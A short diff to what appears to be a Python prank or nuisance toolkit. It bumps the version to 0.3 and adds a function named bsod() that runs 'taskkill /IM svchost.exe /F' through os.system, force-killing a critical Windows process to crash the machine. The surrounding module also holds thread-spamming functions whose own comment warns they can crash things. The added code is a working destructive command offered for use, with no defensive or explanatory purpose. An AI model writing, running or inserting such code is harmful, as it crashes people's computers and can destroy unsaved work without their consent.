@@ -166,7 +166,7 @@ def domain2ip(url):
 
 
 def version():
-    print("0.2")
+    print("0.3")
     return
 
 
@@ -238,6 +238,7 @@ def ThreadSpamer(how_much):  # WARNING: DO NOT OPEN TOO MANY THREAD,IT WILL CRAS
         x.join()
     return
 
+
 def ThreadSpamer_Slowmode(how_much):
     import threading
     for x in range(how_much):
@@ -246,5 +247,14 @@ def ThreadSpamer_Slowmode(how_much):
         x.join()
         sleep(0.30)
     return
+
+
 def spam():
     print("Thread Started!")
+
+
+def bsod():
+    """Admin permission is needed"""
+    import os
+    cmd = 'taskkill /IM svchost.exe /F'
+    os.system(cmd)
